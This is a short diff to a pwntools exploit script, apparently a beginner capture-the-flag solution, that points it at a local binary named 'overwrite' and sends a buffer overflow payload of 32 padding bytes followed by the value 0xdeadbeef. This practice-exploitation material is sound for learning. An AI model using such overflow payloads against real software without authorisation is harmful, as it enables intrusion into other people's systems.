@@ -1,7 +1,7 @@
 from pwn import *
 
 # local process environment
-io = process('./chal')
+io = process('./overwrite')
 
 #remote process environment
 #io = remote('ip',port)
@@ -9,6 +9,6 @@ io = process('./chal')
 context.log_level = 'debug'
 
 # send payload 
-io.sendlineafter(b':', b'AAAAAAA')
+io.sendlineafter(b'?', b'a'*32 + p32(0xdeadbeef))
 
 print(io.recvall().decode())
